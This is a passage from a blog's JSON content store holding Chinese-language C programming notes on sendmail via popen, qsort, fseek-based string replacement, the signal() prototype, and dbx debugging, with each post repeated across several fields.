fputs(\"Message-ID: <1234@local.machine.example>n\", fp);\n        fputs(\"n\", fp);\n        fputs(\"This is a message just to say hello.n\", fp);\n        fputs(\"So, Hellon\", fp);\n        if( pclose(fp) != 0) {\n                printf(\"send mail error.n\");\n                exit(1);\n        }\n        printf(\"send mail done.n\");\n}\n[root@localhost sendmail]# cc sendmail.c\n[root@localhost sendmail]# a.out\nsend mail done.\n[root@localhost sendmail]# tail /var/log/maillog\nMar 16 15:43:45 localhost postfix/sendmail[2124]: fatal: Recipient addresses must be specified on the command line or via the -t option\nMar 16 15:47:33 localhost postfix/qmgr[1059]: 2B7F53F87B: from=<root@localhost.localdomain>, size=431, nrcpt=1 (queue active)\nMar 16 15:47:33 localhost postfix/qmgr[1059]: 667E83F89F: from=<root@localhost.localdomain>, size=431, nrcpt=1 (queue active)\nMar 16 15:47:33 localhost postfix/smtp[2130]: 2B7F53F87B: to=<key1088@163.com>, relay=none, delay=1075, delays=1075/0.08/0/0, dsn=4.4.3, status=deferred (Host or domain name not found. Name service error for name=163.com type=MX: Host not found, try again)\n</pre>\n<p>因为测试环境没有联网，所以是发送不成功。</p>\n"},{"title":"C qsort函数使用","date":"2013-04-13T04:59:17.000Z","_content":"<pre>\n#include <stdio.h>\nint cmp(const void *a,const void *b);\nint main(void)\n{\n    int num[]={10,2,4,1,4,6,7};\n    for(int i=0;i < sizeof(num)/4;i++) {\n        printf(\"%d,\",num[i]);\n    }\n    printf(\"n---------------n\");\n    qsort(num,sizeof(num)/4,sizeof(num[0]),cmp);\n    for(int i=0;i < sizeof(num)/4; i++) {\n        printf(\"%d,\",num[i]);\n    }\n    printf(\"n\");\n    return 0;\n}\nint cmp(const void *a, const void *b)\n{\n    return *(int *)a - *(int *)b;\n}\n</pre>","source":"_posts/C-qsort函数使用.md","raw":"title: C qsort函数使用\ncategories: [程序设计,C编程]\ntags: [qsort]\ndate: 2013-04-13 12:59:17\n---\n<pre>\n#include <stdio.h>\nint cmp(const void *a,const void *b);\nint main(void)\n{\n    int num[]={10,2,4,1,4,6,7};\n    for(int i=0;i < sizeof(num)/4;i++) {\n        printf(\"%d,\",num[i]);\n    }\n    printf(\"n---------------n\");\n    qsort(num,sizeof(num)/4,sizeof(num[0]),cmp);\n    for(int i=0;i < sizeof(num)/4; i++) {\n        printf(\"%d,\",num[i]);\n    }\n    printf(\"n\");\n    return 0;\n}\nint cmp(const void *a, const void *b)\n{\n    return *(int *)a - *(int *)b;\n}\n</pre>","slug":"C-qsort函数使用","published":1,"updated":"2023-04-22T05:38:44.618Z","_id":"clgrjlxby000z7opi4oudgzih","comments":1,"layout":"post","photos":[],"link":"","content":"<pre>\n#include <stdio.h>\nint cmp(const void *a,const void *b);\nint main(void)\n{\n    int num[]={10,2,4,1,4,6,7};\n    for(int i=0;i < sizeof(num)/4;i++) {\n        printf(\"%d,\",num[i]);\n    }\n    printf(\"n---------------n\");\n    qsort(num,sizeof(num)/4,sizeof(num[0]),cmp);\n    for(int i=0;i < sizeof(num)/4; i++) {\n        printf(\"%d,\",num[i]);\n    }\n    printf(\"n\");\n    return 0;\n}\nint cmp(const void *a, const void *b)\n{\n    return *(int *)a - *(int *)b;\n}\n</pre>","site":{"data":{}},"excerpt":"","more":"<pre>\n#include <stdio.h>\nint cmp(const void *a,const void *b);\nint main(void)\n{\n    int num[]={10,2,4,1,4,6,7};\n    for(int i=0;i < sizeof(num)/4;i++) {\n        printf(\"%d,\",num[i]);\n    }\n    printf(\"n---------------n\");\n    qsort(num,sizeof(num)/4,sizeof(num[0]),cmp);\n    for(int i=0;i < sizeof(num)/4; i++) {\n        printf(\"%d,\",num[i]);\n    }\n    printf(\"n\");\n    return 0;\n}\nint cmp(const void *a, const void *b)\n{\n    return *(int *)a - *(int *)b;\n}\n</pre>"},{"title":"C用fseek实现替换文件中字符","date":"2013-04-16T15:25:53.000Z","_content":"使用fseek和ftell来移动到行首，替换字符串。代码如下\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <errno.h>\n#define\tBUFF_SIZE 256\nint showHelp(){\n\tfputs(\"Usage:n\", stdout);\n\tfputs(\"progname [filename] [oldstr] [newstr]n\", stdout);\n\tfputs(\"n\", stdout);\n\treturn -1;\n}\nint replace(char *line, char *oldstr, char *newstr){\n\tchar buf[BUFF_SIZE];\n\tchar *p;\n\tint iLen = 0;\n\tp = strstr(line, oldstr);\n\tif(p) {\n\t\tmemset(buf, 0x00, sizeof(buf));\n\t\tstrcpy(buf, p + strlen(oldstr));\n\t}else{\n\t\treturn 0;\n\t}\n\tiLen = strlen(buf);\n\tif ( buf[iLen-1] == 'n')\n\t\tbuf[iLen]=0;\n\t*p = '\u0000';\n\tstrcat(p, newstr);\n\tstrcat(p, buf);\n\tprintf(\"p=%sn\", p);\n\treturn 1;\n}\nint main(int argc, char **argv)\n{\n\tchar buf[BUFF_SIZE];\n\tFILE *fp;\n\tint iNum = 0;\n\tint i = 0;\n\tlong sttell, endtell;\n\tif(argc != 4) {\n\t\tshowHelp();\n\t\treturn -1;\n\t}\n\tfp = fopen(argv[1],\"r+\");\n\tif(fp == NULL) {\n\t\tperror(\"open file error\");\n\t\treturn -1;\n\t}\n\twhile( ! feof(fp) ) {\n\t\tsttell = ftell(fp);\n\t\tfgets(buf, 256, fp);\n\t\tif(replace(buf, argv[2], argv[3]) != 0) {\n\t\t\tendtell = ftell(fp);\n\t\t\tfseek(fp, sttell - endtell, 1);\n\t\t\tfputs(buf, fp);\n\t\t\tfseek(fp, sttell - endtell, 1);\n\t\t\tiNum++;\n\t\t}\n\t}\n\tfclose(fp);\n\tprintf(\"num=[%d]n\", iNum);\n\treturn 0;\n}\n</pre>","source":"_posts/C用fseek实现替换文件中字符.md","raw":"title: C用fseek实现替换文件中字符\ncategories: [程序设计,C编程]\ntags: [fseek,ftell]\ndate: 2013-04-16 23:25:53\n---\n使用fseek和ftell来移动到行首，替换字符串。代码如下\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <errno.h>\n#define\tBUFF_SIZE 256\nint showHelp(){\n\tfputs(\"Usage:n\", stdout);\n\tfputs(\"progname [filename] [oldstr] [newstr]n\", stdout);\n\tfputs(\"n\", stdout);\n\treturn -1;\n}\nint replace(char *line, char *oldstr, char *newstr){\n\tchar buf[BUFF_SIZE];\n\tchar *p;\n\tint iLen = 0;\n\tp = strstr(line, oldstr);\n\tif(p) {\n\t\tmemset(buf, 0x00, sizeof(buf));\n\t\tstrcpy(buf, p + strlen(oldstr));\n\t}else{\n\t\treturn 0;\n\t}\n\tiLen = strlen(buf);\n\tif ( buf[iLen-1] == 'n')\n\t\tbuf[iLen]=0;\n\t*p = '\u0000';\n\tstrcat(p, newstr);\n\tstrcat(p, buf);\n\tprintf(\"p=%sn\", p);\n\treturn 1;\n}\nint main(int argc, char **argv)\n{\n\tchar buf[BUFF_SIZE];\n\tFILE *fp;\n\tint iNum = 0;\n\tint i = 0;\n\tlong sttell, endtell;\n\tif(argc != 4) {\n\t\tshowHelp();\n\t\treturn -1;\n\t}\n\tfp = fopen(argv[1],\"r+\");\n\tif(fp == NULL) {\n\t\tperror(\"open file error\");\n\t\treturn -1;\n\t}\n\twhile( ! feof(fp) ) {\n\t\tsttell = ftell(fp);\n\t\tfgets(buf, 256, fp);\n\t\tif(replace(buf, argv[2], argv[3]) != 0) {\n\t\t\tendtell = ftell(fp);\n\t\t\tfseek(fp, sttell - endtell, 1);\n\t\t\tfputs(buf, fp);\n\t\t\tfseek(fp, sttell - endtell, 1);\n\t\t\tiNum++;\n\t\t}\n\t}\n\tfclose(fp);\n\tprintf(\"num=[%d]n\", iNum);\n\treturn 0;\n}\n</pre>","slug":"C用fseek实现替换文件中字符","published":1,"updated":"2023-04-22T05:38:44.625Z","_id":"clgrjlxc000107opi87bkdt9s","comments":1,"layout":"post","photos":[],"link":"","content":"<p>使用fseek和ftell来移动到行首，替换字符串。代码如下</p>\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <errno.h>\n#define\tBUFF_SIZE 256\nint showHelp(){\n    fputs(\"Usage:n\", stdout);\n    fputs(\"progname [filename] [oldstr] [newstr]n\", stdout);\n    fputs(\"n\", stdout);\n    return -1;\n}\nint replace(char *line, char *oldstr, char *newstr){\n    char buf[BUFF_SIZE];\n    char *p;\n    int iLen = 0;\n    p = strstr(line, oldstr);\n    if(p) {\n        memset(buf, 0x00, sizeof(buf));\n        strcpy(buf, p + strlen(oldstr));\n    }else{\n        return 0;\n    }\n    iLen = strlen(buf);\n    if ( buf[iLen-1] == 'n')\n        buf[iLen]=0;\n    *p = '\u0000';\n    strcat(p, newstr);\n    strcat(p, buf);\n    printf(\"p=%sn\", p);\n    return 1;\n}\nint main(int argc, char **argv)\n{\n    char buf[BUFF_SIZE];\n    FILE *fp;\n    int iNum = 0;\n    int i = 0;\n    long sttell, endtell;\n    if(argc != 4) {\n        showHelp();\n        return -1;\n    }\n    fp = fopen(argv[1],\"r+\");\n    if(fp == NULL) {\n        perror(\"open file error\");\n        return -1;\n    }\n    while( ! feof(fp) ) {\n        sttell = ftell(fp);\n        fgets(buf, 256, fp);\n        if(replace(buf, argv[2], argv[3]) != 0) {\n            endtell = ftell(fp);\n            fseek(fp, sttell - endtell, 1);\n            fputs(buf, fp);\n            fseek(fp, sttell - endtell, 1);\n            iNum++;\n        }\n    }\n    fclose(fp);\n    printf(\"num=[%d]n\", iNum);\n    return 0;\n}\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>使用fseek和ftell来移动到行首，替换字符串。代码如下</p>\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <errno.h>\n#define\tBUFF_SIZE 256\nint showHelp(){\n    fputs(\"Usage:n\", stdout);\n    fputs(\"progname [filename] [oldstr] [newstr]n\", stdout);\n    fputs(\"n\", stdout);\n    return -1;\n}\nint replace(char *line, char *oldstr, char *newstr){\n    char buf[BUFF_SIZE];\n    char *p;\n    int iLen = 0;\n    p = strstr(line, oldstr);\n    if(p) {\n        memset(buf, 0x00, sizeof(buf));\n        strcpy(buf, p + strlen(oldstr));\n    }else{\n        return 0;\n    }\n    iLen = strlen(buf);\n    if ( buf[iLen-1] == 'n')\n        buf[iLen]=0;\n    *p = '\u0000';\n    strcat(p, newstr);\n    strcat(p, buf);\n    printf(\"p=%sn\", p);\n    return 1;\n}\nint main(int argc, char **argv)\n{\n    char buf[BUFF_SIZE];\n    FILE *fp;\n    int iNum = 0;\n    int i = 0;\n    long sttell, endtell;\n    if(argc != 4) {\n        showHelp();\n        return -1;\n    }\n    fp = fopen(argv[1],\"r+\");\n    if(fp == NULL) {\n        perror(\"open file error\");\n        return -1;\n    }\n    while( ! feof(fp) ) {\n        sttell = ftell(fp);\n        fgets(buf, 256, fp);\n        if(replace(buf, argv[2], argv[3]) != 0) {\n            endtell = ftell(fp);\n            fseek(fp, sttell - endtell, 1);\n            fputs(buf, fp);\n            fseek(fp, sttell - endtell, 1);\n            iNum++;\n        }\n    }\n    fclose(fp);\n    printf(\"num=[%d]n\", iNum);\n    return 0;\n}\n</pre>"},{"title":"C专家编程—分析signal函数的原型声明","date":"2014-03-11T13:42:40.000Z","_content":"在ANSI标准中，signal()的声明如下：\nvoid (*signal(int sig,void (*func)(int)))(int)\nsignal是一个函数，它返回一个函数指针，后者所指向的函数(signal的返回值)接受一个int参数并返回void。signal函数有两个参数，一个是sig(为int类型)，另一个是func(为void(*)(int)类型)。\nvoid (*func)(int)是一个函数指针，所指向的函数接受一个int参数，返回值是void。\n下面用typedef进行简化：\ntypedef void（*ptr_to_func）(int);\nptr_to_func signal（int，ptr_to_func）;\n网上的一个例子：\n<pre>\n#include <stdio.h>\nenum { RED, GREEN, BLUE };\nvoid OutputSignal(int sig)\n{\n    printf(\"The signal you /'ve input is: \");\n    switch(sig)\n    {\n    case RED:\n        puts(\"RED!\");\n        break;\n    case GREEN:\n        puts(\"GREEN!\");\n        break;\n    case BLUE:\n        puts(\"BLUE!\");\n        break;\n    }\n}\nvoid ( *signal( int sig, void (*func)(int) ) ) (int)\n{\n    puts(\"Hello, world!\");\n    func(sig);\n    return func;\n}\nint main(void)\n{\n    (*signal(GREEN, &amp;OutputSignal))(RED);\n    return 0;\n}\nOutput:\nHello, world!\nThe signal you 've input is: GREEN!\nThe signal you 've input is: RED!</pre>","source":"_posts/C专家编程—分析signal函数的原型声明.md","raw":"title: C专家编程—分析signal函数的原型声明\ncategories: [程序设计,C编程]\ntags: []\ndate: 2014-03-11 21:42:40\n---\n在ANSI标准中，signal()的声明如下：\nvoid (*signal(int sig,void (*func)(int)))(int)\nsignal是一个函数，它返回一个函数指针，后者所指向的函数(signal的返回值)接受一个int参数并返回void。signal函数有两个参数，一个是sig(为int类型)，另一个是func(为void(*)(int)类型)。\nvoid (*func)(int)是一个函数指针，所指向的函数接受一个int参数，返回值是void。\n下面用typedef进行简化：\ntypedef void（*ptr_to_func）(int);\nptr_to_func signal（int，ptr_to_func）;\n网上的一个例子：\n<pre>\n#include <stdio.h>\nenum { RED, GREEN, BLUE };\nvoid OutputSignal(int sig)\n{\n    printf(\"The signal you /'ve input is: \");\n    switch(sig)\n    {\n    case RED:\n        puts(\"RED!\");\n        break;\n    case GREEN:\n        puts(\"GREEN!\");\n        break;\n    case BLUE:\n        puts(\"BLUE!\");\n        break;\n    }\n}\nvoid ( *signal( int sig, void (*func)(int) ) ) (int)\n{\n    puts(\"Hello, world!\");\n    func(sig);\n    return func;\n}\nint main(void)\n{\n    (*signal(GREEN, &amp;OutputSignal))(RED);\n    return 0;\n}\nOutput:\nHello, world!\nThe signal you 've input is: GREEN!\nThe signal you 've input is: RED!</pre>","slug":"C专家编程—分析signal函数的原型声明","published":1,"updated":"2023-04-22T05:38:44.621Z","_id":"clgrjlxc100127opi1217c7hi","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在ANSI标准中，signal()的声明如下：<br>void (*signal(int sig,void (<em>func)(int)))(int)<br>signal是一个函数，它返回一个函数指针，后者所指向的函数(signal的返回值)接受一个int参数并返回void。signal函数有两个参数，一个是sig(为int类型)，另一个是func(为void(</em>)(int)类型)。<br>void (<em>func)(int)是一个函数指针，所指向的函数接受一个int参数，返回值是void。<br>下面用typedef进行简化：<br>typedef void（</em>ptr_to_func）(int);<br>ptr_to_func signal（int，ptr_to_func）;<br>网上的一个例子：</p>\n<pre>\n#include <stdio.h>\nenum { RED, GREEN, BLUE };\nvoid OutputSignal(int sig)\n{\n    printf(\"The signal you /'ve input is: \");\n    switch(sig)\n    {\n    case RED:\n        puts(\"RED!\");\n        break;\n    case GREEN:\n        puts(\"GREEN!\");\n        break;\n    case BLUE:\n        puts(\"BLUE!\");\n        break;\n    }\n}\nvoid ( *signal( int sig, void (*func)(int) ) ) (int)\n{\n    puts(\"Hello, world!\");\n    func(sig);\n    return func;\n}\nint main(void)\n{\n    (*signal(GREEN, &amp;OutputSignal))(RED);\n    return 0;\n}\nOutput:\nHello, world!\nThe signal you 've input is: GREEN!\nThe signal you 've input is: RED!</pre>","site":{"data":{}},"excerpt":"","more":"<p>在ANSI标准中，signal()的声明如下：<br>void (*signal(int sig,void (<em>func)(int)))(int)<br>signal是一个函数，它返回一个函数指针，后者所指向的函数(signal的返回值)接受一个int参数并返回void。signal函数有两个参数，一个是sig(为int类型)，另一个是func(为void(</em>)(int)类型)。<br>void (<em>func)(int)是一个函数指针，所指向的函数接受一个int参数，返回值是void。<br>下面用typedef进行简化：<br>typedef void（</em>ptr_to_func）(int);<br>ptr_to_func signal（int，ptr_to_func）;<br>网上的一个例子：</p>\n<pre>\n#include <stdio.h>\nenum { RED, GREEN, BLUE };\nvoid OutputSignal(int sig)\n{\n    printf(\"The signal you /'ve input is: \");\n    switch(sig)\n    {\n    case RED:\n        puts(\"RED!\");\n        break;\n    case GREEN:\n        puts(\"GREEN!\");\n        break;\n    case BLUE:\n        puts(\"BLUE!\");\n        break;\n    }\n}\nvoid ( *signal( int sig, void (*func)(int) ) ) (int)\n{\n    puts(\"Hello, world!\");\n    func(sig);\n    return func;\n}\nint main(void)\n{\n    (*signal(GREEN, &amp;OutputSignal))(RED);\n    return 0;\n}\nOutput:\nHello, world!\nThe signal you 've input is: GREEN!\nThe signal you 've input is: RED!</pre>"},{"title":"dbx使用","date":"2012-11-28T01:33:00.000Z","_content":"<p>1、当程序发生Segmentation fault错误时，会生成core文件，用dbx定位那行代码引起的<br />$ dbx pgm core<br />Type 'help' for help.<br />warning: The core file is not a fullcore. Some info may<br />not be available.<br />[using memory image in core]<br />reading symbolic information ...</p><p>Segmentation fault in main at line 122<br />122&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(&quot;pint: %dn&quot;, *pint); //要在这里输出源码，cc编译时必须指定-g选项<br />2、当程序运行进入死循环不退出时，attach进程，定位程序正在执行的代码位置<br />例如pgm程序一直运行不结束<br />$ ps -ef|grep pgm<br />usr1 1347736 483328 115 11:28:58 pts/1 0:06 pgm<br />usr1 1507512 667666&nbsp;&nbsp; 0 11:29:06 pts/7 0:00 grep pgm<br />$ dbx -a 1347736<br />Waiting to attach to process 1347736 ...<br />Successfully attached to pgm.<br />Type 'help' for help.<br />reading symbolic information ...<br />stopped in unnamed block in main at line 26<br />&nbsp;&nbsp; 26&nbsp;&nbsp; while (1){<br />(dbx) quit //pgm程序同时会结束运行，但可以先detach这个进程再退出。<br />4）查看运行中变量值，dump当前proc中的所有变量<br />(dbx) dump<br />main(), line 40 in &quot;pgm.c&quot;<br />pint = 0x2ff22ba0<br />pintvar = 5<br />pstring = &quot;&quot;<br />__func__ = &quot;main&quot;<br />(dbx)<br />如果需要查看某个内存地址值，命令：address/mode<br />例如pint指针地址（pint_addr: 804399856），二进制为：0x2ff22af0，<br />(dbx) 0x2ff22af0/D&nbsp;&nbsp; //按十进制打印一个长字<br />0x2ff22af0: 5</p><p>$man ulimit</p><p>ulimit Command</p><p>Purpose</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sets or reports user resource limits.</p><p>Syntax</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ulimit [ -H ] [ -S ] [ -a ] [ -c ] [ -d ] [ -f ] [ -m ] [ -n ] [ -r ] [ -s ] [ -t ] [-u ][ Limit ]</p><p>Description</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The ulimit command sets or reports user process resource limits, as defined in the /etc/security/limits file. This file<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; contains these default limits:</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fsize = 2097151<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; core = 2097151<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cpu = -1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data = 262144<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rss = 65536<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stack = 65536<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nofiles = 2000<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; threads = -1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nproc = -1</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; These values are used as default settings when a new user is added to the system. The values are set with the mkuser<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; command when the user is added to the system, or changed with the chuser command.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Limits are categorized as either soft or hard. With the ulimit command, you can change your soft limits, up to the maximum<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set by the hard limits. You must have root user authority to change resource hard limits.</p><p>test $ ulimit -c<br />0<br />test $ ulimit -c 1000<br />test $ ulimit -c<br />1000</p><p>#&amp;g_test/16x 显示从 g_test 的地址开始处，连续 16 个 WORD（?byte）的取值</p><p>列举寄存器内容：</p><p>(dbx) registers</p><p>&nbsp;<img src=\"/images/pic/4afe5e81d158ccbf4465478a19d8bc3eb035414d.jpg\" small=\"0\" /><br /></p><p>显示寄存器中变量值，例如显示$r0的值&nbsp;</p><p>(dbx)p $r0</p><p>0x100001bc </p>","source":"_posts/dbx使用.md","raw":"title: dbx使用\ncategories: [C编程]\ntags: [C;dbx]\ndate: 2012-11-28 09:33:00\n---\n<p>1、当程序发生Segmentation fault错误时，会生成core文件，用dbx定位那行代码引起的<br />$ dbx pgm core<br />Type 'help' for help.<br />warning: The core file is not a fullcore. Some info may<br />not be available.<br />[using memory image in core]<br />reading symbolic information ...</p><p>Segmentation fault in main at line 122<br />122&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(&quot;pint: %dn&quot;, *pint); //要在这里输出源码，cc编译时必须指定-g选项<br />2、当程序运行进入死循环不退出时，attach进程，定位程序正在执行的代码位置<br />例如pgm程序一直运行不结束<br />$ ps -ef|grep pgm<br />usr1 1347736 483328 115 11:28:58 pts/1 0:06 pgm<br />usr1 1507512 667666&nbsp;&nbsp; 0 11:29:06 pts/7 0:00 grep pgm<br />$ dbx -a 1347736<br />Waiting to attach to process 1347736 ...<br />Successfully attached to pgm.<br />Type 'help' for help.<br />reading symbolic information ...<br />stopped in unnamed block in main at line 26<br />&nbsp;&nbsp; 26&nbsp;&nbsp; while (1){<br />(dbx) quit //pgm程序同时会结束运行，但可以先detach这个进程再退出。<br />4）查看运行中变量值，dump当前proc中的所有变量<br />(dbx) dump<br />main(), line 40 in &quot;pgm.c&quot;<br />pint = 0x2ff22ba0<br />pintvar = 5<br />pstring = &quot;&quot;<br />__func__ = &quot;main&quot;<br />(dbx)<br />如果需要查看某个内存地址值，命令：address/mode<br />例如pint指针地址（pint_addr: 804399856），二进制为：0x2ff22af0，<br />(dbx) 0x2ff22af0/D&nbsp;&nbsp; //按十进制打印一个长字<br />0x2ff22af0: 5</p><p>$man ulimit</p><p>ulimit Command</p><p>Purpose</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sets or reports user resource limits.</p><p>Syntax</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ulimit [ -H ] [ -S ] [ -a ] [ -c ] [ -d ] [ -f ] [ -m ] [ -n ] [ -r ] [ -s ] [ -t ] [-u ][ Limit ]</p><p>Description</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The ulimit command sets or reports user process resource limits, as defined in the /etc/security/limits file. This file<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; contains these default limits:</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fsize = 2097151<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; core = 2097151<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cpu = -1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data = 262144<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rss = 65536<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stack = 65536<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nofiles = 2000<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; threads = -1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nproc = -1</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; These values are used as default settings when a new user is added to the system. The values are set with the mkuser<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; command when the user is added to the system, or changed with the chuser command.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Limits are categorized as either soft or hard. With the ulimit command, you can change your soft limits, up to the maximum<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set by the hard limits. You must have root user authority to change resource hard limits.</p><p>test $ ulimit -c<br />0<br />test $ ulimit -c 1000<br />test $ ulimit -c<br />1000</p><p>#&amp;g_test/16x 显示从 g_test 的地址开始处，连续 16 个 WORD（?byte）的取值</p><p>列举寄存器内容：</p><p>(dbx) registers</p><p>&nbsp;<img src=\"/images/pic/4afe5e81d158ccbf4465478a19d8bc3eb035414d.jpg\" small=\"0\" /><br /></p><p>显示寄存器中变量值，例如显示$r0的值&nbsp;</p><p>(dbx)p $r0</p><p>0x100001bc </p>","slug":"dbx使用","published":1,"updated":"2023-04-22T05:38:44.744Z","_id":"clgrjlxc200157opi7rchao5q","comments":1,"layout":"post","photos":[],"link":"","content":"<p>1、当程序发生Segmentation fault错误时，会生成core文件，用dbx定位那行代码引起的<br />$ dbx pgm core<br />Type 'help' for help.<br />warning: The core file is not a fullcore. Some info may<br />not be available.<br />[using memory image in core]<br />reading symbolic information ...</p><p>Segmentation fault in main at line 122<br />122&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(&quot;pint: %dn&quot;, *pint); //要在这里输出源码，cc编译时必须指定-g选项<br />2、当程序运行进入死循环不退出时，attach进程，定位程序正在执行的代码位置<br />例如pgm程序一直运行不结束<br />$ ps -ef|grep pgm<br />usr1 1347736 483328 115 11:28:58 pts/1 0:06 pgm<br />usr1 1507512 667666&nbsp;&nbsp; 0 11:29:06 pts/7 0:00 grep pgm<br />$ dbx -a 1347736<br />Waiting to attach to process 1347736 ...<br />Successfully attached to pgm.<br />Type 'help' for help.<br />reading symbolic information ...<br />stopped in unnamed block in main at line 26<br />&nbsp;&nbsp; 26&nbsp;&nbsp; while (1){<br />(dbx) quit //pgm程序同时会结束运行，但可以先detach这个进程再退出。<br />4）查看运行中变量值，dump当前proc中的所有变量<br />(dbx) dump<br />main(), line 40 in &quot;pgm.c&quot;<br />pint = 0x2ff22ba0<br />pintvar = 5<br />pstring = &quot;&quot;<br />__func__ = &quot;main&quot;<br />(dbx)<br />如果需要查看某个内存地址值，命令：address/mode<br />例如pint指针地址（pint_addr: 804399856），二进制为：0x2ff22af0，<br />(dbx) 0x2ff22af0/D&nbsp;&nbsp; //按十进制打印一个长字<br />0x2ff22af0: 5</p><p>$man ulimit</p><p>ulimit Command</p><p>Purpose</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sets or reports user resource limits.</p><p>Syntax</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ulimit [ -H ] [ -S ] [ -a ] [ -c ] [ -d ] [ -f ] [ -m ] [ -n ] [ -r ] [ -s ] [ -t ] [-u ][ Limit ]</p><p>Description</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The ulimit command sets or reports user process resource limits, as defined in the /etc/security/limits file. This file<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; contains these default limits:</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fsize = 2097151<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; core = 2097151<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cpu = -1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data = 262144<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rss = 65536<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stack = 65536<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nofiles = 2000<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; threads = -1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nproc = -1</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; These values are used as default settings when a new user is added to the system. The values are set with the mkuser<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; command when the user is added to the system, or changed with the chuser command.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Limits are categorized as either soft or hard. With the ulimit command, you can change your soft limits, up to the maximum<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set by the hard limits. You must have root user authority to change resource hard limits.</p><p>test $ ulimit -c<br />0<br />test $ ulimit -c 1000<br />test $ ulimit -c<br />1000</p><p>#&amp;g_test/16x 显示从 g_test 的地址开始处，连续 16 个 WORD（?byte）的取值</p><p>列举寄存器内容：</p><p>(dbx) registers</p><p>&nbsp;<img src=\"/images/pic/4afe5e81d158ccbf4465478a19d8bc3eb035414d.jpg\" small=\"0\" /><br /></p><p>显示寄存器中变量值，例如显示$r0的值&nbsp;</p><p>(dbx)p $r0</p><p>0x100001bc </p>","site":{"data":{}},"excerpt":"","more":"<p>1、当程序发生Segmentation fault错误时，会生成core文件，用dbx定位那行代码引起的<br />$ dbx pgm core<br />Type 'help' for help.<br />warning: The core file is not a fullcore. Some info may<br />not be available.<br />[using memory image in core]<br />reading symbolic information ...</p><p>Segmentation fault in main at line 122<br />122&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(&quot;pint: %dn&quot;, *pint); //要在这里输出源码，cc编译时必须指定-g选项<br />2、当程序运行进入死循环不退出时，attach进程，定位程序正在执行的代码位置<br />例如pgm程序一直运行不结束<br />$ ps -ef|grep pgm<br />usr1 1347736 483328 115 11:28:58 pts/1 0:06 pgm<br />usr1 1507512 667666&nbsp;&nbsp; 0 11:29:06 pts/7 0:00 grep pgm<br />$ dbx -a 1347736<br />Waiting to attach to process 1347736 ...<br />Successfully attached to pgm.<br />Type 'help' for help.<br />reading symbolic information ...<br />stopped 